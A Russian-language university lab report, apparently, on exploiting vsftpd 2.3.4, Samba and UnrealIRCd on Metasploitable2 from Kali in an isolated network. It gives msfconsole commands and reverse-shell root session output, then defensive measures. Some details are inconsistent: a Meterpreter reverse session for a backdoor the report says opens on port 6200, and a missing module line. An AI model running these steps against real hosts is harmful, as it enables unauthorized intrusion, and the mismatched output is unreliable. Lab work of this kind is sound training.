## 1. Цель и задачи

**Цель:** произвести атаку на ОС Metasploitable2 с помощью ОС Kali Linux и её инструментария.

**Задачи:**
1. Настроить инфраструктуру для выполнения лабораторной работы.
2. Определить доступные сервисы на исследуемой машине.
3. Получить удалённый доступ путём эксплуатации уязвимостей 3 различных сервисов.
4. Оформить отчёт по лабораторной работе.

> Все работы выполнены в **изолированной виртуальной сети** (VMware, Host-only) без доступа в интернет со стороны машины-жертвы.

## 4. Эксплуатация уязвимостей (3 сервиса)

Эксплуатация выполнена средствами **Metasploit Framework** (`msfconsole`).
Здесь `RHOSTS` — машина-жертва (192.168.149.135), `LHOST` — машина-атакующий (192.168.149.134).

### 4.1. Сервис 1 — FTP: vsftpd 2.3.4 (CVE-2011-2523)

**Описание уязвимости:** в версию vsftpd 2.3.4 был внедрён бэкдор: при передаче имени пользователя, содержащего `:)`, на порту 6200 открывается командная оболочка с правами root.

**Вызванные команды:**

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.149.135
set LHOST 192.168.149.134
run
```

**Вывод:**

```
[*] Started reverse TCP handler on 192.168.149.134:4444
[+] 192.168.149.135:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.149.134:4444 -> 192.168.149.135:50963)

meterpreter > getuid
Server username: root
```

**Результат:** получен доступ с правами **root**.

**Скриншот:**

![vsftpd](screenshots/03_vsftpd.png)

---

### 4.2. Сервис 2 — Samba: «username map script» (CVE-2007-2447)

**Описание уязвимости:** ошибка обработки имени пользователя в Samba позволяет без аутентификации выполнить произвольную команду ОС (инъекция команд).

**Вызванные команды:**

```

set RHOSTS 192.168.149.135
set LHOST 192.168.149.134
run
```

**Вывод:**

```
[*] Started reverse TCP handler on 192.168.149.134:4444
[*] Command shell session 2 opened (192.168.149.134:4444 -> 192.168.149.135:...)

whoami
root
```

**Результат:** получен доступ с правами **root**.

**Скриншот:**

![samba](screenshots/04_samba.png)

### 4.3. Сервис 3 — IRC: UnrealIRCd 3.2.8.1 (CVE-2010-2075)

**Описание уязвимости:** в архив UnrealIRCd 3.2.8.1 был внедрён бэкдор, позволяющий выполнять произвольные команды на сервере.

**Результат:** получен доступ с правами **root**.

## 5. Выводы

В ходе работы:

1. Развёрнута изолированная лабораторная инфраструктура из двух ВМ (Kali Linux — 192.168.149.134 и Metasploitable2 — 192.168.149.135), связь проверена командой `ping`.
2. С помощью `nmap -sV` проведена разведка и составлена карта запущенных сетевых сервисов и их версий.
3. Получен удалённый доступ с правами **root** путём эксплуатации уязвимостей **3 различных сервисов**:
   - vsftpd 2.3.4 — бэкдор в дистрибутиве (CVE-2011-2523);
   - Samba — инъекция команд «username map script» (CVE-2007-2447);
   - UnrealIRCd — бэкдор в дистрибутиве (CVE-2010-2075).

**Классы продемонстрированных уязвимостей:** внедрённые бэкдоры в скомпрометированных дистрибутивах ПО и инъекция команд ОС из-за некорректной обработки пользовательского ввода.

**Меры защиты:**
- своевременная установка обновлений, использование ПО из доверенных источников с проверкой контрольных сумм/подписей;
- отключение неиспользуемых сетевых служб;
- сегментация сети и межсетевое экранирование, ограничение доступа к портам;
- применение IDS/IPS и регулярный аудит безопасности сканерами уязвимостей.
